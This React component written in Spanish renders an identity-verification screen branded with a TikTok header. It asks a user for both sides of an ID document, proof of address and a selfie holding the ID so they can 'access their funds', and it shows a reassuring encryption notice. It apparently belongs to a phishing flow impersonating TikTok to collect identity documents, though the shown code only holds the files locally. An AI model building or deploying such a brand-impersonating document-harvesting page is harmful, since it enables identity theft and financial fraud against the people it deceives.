import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Upload, CheckCircle, ShieldCheck, Camera } from "lucide-react";
import { Progress } from "@/components/ui/progress";
import TikTokHeader from "./TikTokHeader";

interface DocumentUploadScreenProps {
  userName: string;
  onSubmit: () => void;
}

interface UploadField {
  label: string;
  description: string;
  key: string;
}

const fields: UploadField[] = [
  { label: "Documento de identidad (anverso)", description: "Sube el anverso de tu DNI, pasaporte o carnet de conducir", key: "id_front" },
  { label: "Documento de identidad (reverso)", description: "Sube el reverso de tu documento de identidad", key: "id_back" },
  { label: "Justificante de domicilio", description: "Recibo de servicios o extracto bancario (últimos 3 meses)", key: "residence" },
  { label: "Selfie con documento", description: "Hazte un selfie sosteniendo tu documento de identidad", key: "selfie" },
];

const DocumentUploadScreen = ({ userName, onSubmit }: DocumentUploadScreenProps) => {
  const [files, setFiles] = useState<Record<string, File | null>>({});

  const handleFile = (key: string, file: File | null) => {
    setFiles((prev) => ({ ...prev, [key]: file }));
  };

  const uploadedCount = fields.filter((f) => files[f.key]).length;
  const allUploaded = uploadedCount === fields.length;
  const progressPercent = (uploadedCount / fields.length) * 100;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <TikTokHeader showHelp />

      <div className="flex-1 px-6 py-6">
        <p className="text-sm text-muted-foreground mb-1">
          Bienvenido/a de nuevo, <strong className="text-foreground">{userName}!</strong>
        </p>

        {/* Step indicator */}
        <div className="mt-4 mb-2 flex items-center justify-between">
          <h2 className="text-xl font-semibold">Verifica tu identidad</h2>
          <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
            Paso 2 de 4
          </span>
        </div>
        <p className="text-sm text-muted-foreground mb-4">
          Sube los documentos necesarios para verificar tu cuenta y acceder a tus fondos.
        </p>

        {/* Security notice */}
        <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
          <ShieldCheck className="w-4 h-4 text-success shrink-0" />
          <p className="text-xs text-muted-foreground">Tus datos están <strong className="text-foreground">cifrados</strong> y protegidos. Nunca compartimos tus documentos.</p>
        </div>

        {/* Progress bar */}
        <div className="mb-6">
          <div className="flex justify-between text-xs text-muted-foreground mb-1.5">
            <span>{uploadedCount} de {fields.length} subidos</span>
            <span>{Math.round(progressPercent)}%</span>
          </div>
          <Progress value={progressPercent} className="h-2" />
        </div>

        <div className="space-y-3">
          {fields.map((field) => {
            const uploaded = !!files[field.key];
            return (
              <label
                key={field.key}
                className={`flex items-center gap-4 p-4 rounded-xl border cursor-pointer transition-all duration-200 ${
                  uploaded
                    ? "border-success/40 bg-success/5 shadow-sm"
                    : "border-border bg-card hover:border-foreground/30 hover:shadow-sm hover:bg-secondary/50"
                }`}
              >
                <div className={`flex items-center justify-center w-10 h-10 rounded-full shrink-0 ${
                  uploaded ? "bg-success/10" : "bg-secondary"
                }`}>
                {uploaded ? (
                    <CheckCircle className="w-5 h-5 text-success" />
                  ) : field.key === "selfie" ? (
                    <Camera className="w-4 h-4 text-muted-foreground" />
                  ) : (
                    <Upload className="w-4 h-4 text-muted-foreground" />
                  )}
                </div>
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-semibold">{field.label}</p>
                  <p className="text-xs text-muted-foreground">{field.description}</p>
                  {!files[field.key] && (
                    <p className="text-[10px] text-muted-foreground/60 mt-0.5">JPG, PNG o PDF · Máx 10MB</p>
                  )}
                  {files[field.key] && (
                    <p className="text-xs text-success mt-1 font-medium truncate">
                      ✓ {files[field.key]!.name}
                    </p>
                  )}
                </div>
                <input
                  type="file"
                  accept="image/*,.pdf"
                  className="hidden"
                  onChange={(e) => handleFile(field.key, e.target.files?.[0] || null)}
                />
              </label>
            );
          })}
        </div>

        <Button
          onClick={onSubmit}
          disabled={!allUploaded}
          className="w-full h-14 rounded-full text-base font-semibold mt-8"
        >
          Enviar documentos
        </Button>
      </div>
    </div>
  );
};

export default DocumentUploadScreen;
